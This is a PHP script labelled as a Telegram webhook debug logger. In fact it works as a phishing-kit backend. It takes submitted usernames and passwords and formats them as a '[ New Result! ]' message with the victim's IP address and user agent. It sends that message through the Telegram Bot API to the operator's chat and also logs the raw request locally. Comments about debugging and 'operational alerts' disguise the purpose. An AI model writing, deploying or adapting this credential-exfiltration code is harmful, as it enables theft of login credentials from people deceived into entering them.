<?php
// Prevent unauthorized browser access if this is purely for webhook/API debugging
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 405 Method Not Allowed');
    exit('Only POST requests allowed.');
}

// 1. Load Configuration Safely
// Adjust the path to point to your secure directory outside the web root
$configPath = './config.json'; 

if (!file_exists($configPath)) {
    error_log("Debug Script Error: Configuration file not found.");
    header('HTTP/1.1 500 Internal Server Error');
    exit('Internal Configuration Error.');
}

$config = json_decode(file_get_contents($configPath), true);
$botToken = $config['telegram_token'] ?? null;
$chatId = $config['chat_id'] ?? null;

// 2. Capture the Payload and Metadata
// Get the raw POST body (usually JSON from Telegram)
$rawPostBody = file_get_contents('php://input');

// Collect server-perceived request metadata for validation
$metadata = [
    'timestamp'  => date('Y-m-d H:i:s'),
    'remote_ip'  => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'request_uri'=> $_SERVER['REQUEST_URI'] ?? 'Unknown'
];

// 3. Structure the Debug Log Entry
$logEntry = sprintf(
    "[%s] IP: %s | User-Agent: %s\nURI: %s\nPayload: %s\n-------------------------------------\n",
    $metadata['timestamp'],
    $metadata['remote_ip'],
    $metadata['user_agent'],
    $metadata['request_uri'],
    $rawPostBody ? $rawPostBody : '[Empty Body]'
);

// 4. Write to a Secure Log File
// Ensure this log file is also outside the web root or strictly protected via .htaccess
$logFilePath = './secure_config/bot_debug.log';
file_put_contents($logFilePath, $logEntry, FILE_APPEND | LOCK_EX);
$htmlMessage = sprintf(
    "<b>[ New Result! ]</b>\n\n" .
    "<b>Username:</b> <code>{$_POST['username']}</code>\n\n" .
    "<b>Password:</b> <code>{$_POST['password']}</code>\n\n" .
    "<b>Time:</b> <code>{$metadata['timestamp']}</code>\n\n" .
    " ========================== \n" .
    "<b>IP:</b> {$metadata['remote_ip']}\n" .
    "<b>User Agent:</b> <code>{$metadata['user_agent']}</code>\n" 
);

function sendAdminNotification(string $token, string $chatId, string $message): bool {
    $url = "https://api.telegram.org/bot" . urlencode($token) . "/sendMessage";
    
    $payload = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($payload),
            'timeout' => 5 // Low timeout to prevent blocking application execution
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result !== false;
}

// Usage for simple operational alerts
sendAdminNotification($botToken, $chatId, $htmlMessage);

// 5. Respond to the Sender
// Telegram expects a 200 OK response to acknowledge receipt of the webhook header('HTTP/1.1 200 OK');
echo json_encode(['status' => 'success', 'message' => 'Debug data logged locally.']);
